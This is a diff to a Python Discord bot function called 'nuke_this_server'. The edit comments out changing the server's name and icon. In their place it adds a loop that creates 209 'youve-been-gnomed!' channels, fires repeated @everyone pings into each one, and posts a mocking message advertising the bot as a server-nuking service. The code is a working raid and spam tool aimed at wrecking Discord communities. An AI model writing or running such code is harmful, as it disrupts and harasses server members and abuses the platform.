@@ -44,24 +44,22 @@ async def nuke_this_server(ctx):
 
 
     # Step 4: Change server image and server name
-    with open('gnomed_image.jpg', 'rb') as f:
-        icon = f.read()
+    # with open('gnomed_image.jpg', 'rb') as f:
+    #     icon = f.read()
+    #
+    # await guild.edit(name="YOU GOT GNOMED!!!", icon=icon)
 
-    await guild.edit(name="YOU GOT GNOMED!!!", icon=icon)
+    # Step 5: Create channel and Send message in channel
 
-    # Step 5: Create text-channel
-    important_channel = await guild.create_text_channel("_IMPORTANT")
+    for i in range(1, 210):
+        important_channel = await guild.create_text_channel("youve-been-gnomed!")
+        for ii in range(1, 5):
+            await important_channel.send("@everyone @everyone @everyone")
 
-    # Step 6: Send message in channel
-    await important_channel.send("@everyone \n"
-                                 "You've been gnomed! Congratulations! \n"
-                                 "This bot is a service to nuke servers so, \n"
-                                 "If you are Kim Jong Un, feel free to use this!")
-
-    for i in range(1, 50):
-        await guild.create_text_channel("youve-been-gnomed!")
-
-
+        await important_channel.send("@everyone \n"
+                                         "You've been gnomed! Congratulations! \n"
+                                         "This bot is a service to nuke servers so, \n"
+                                         "If you are Kim Jong Un, feel free to use this!")
 
 
 async def is_owner(ctx):
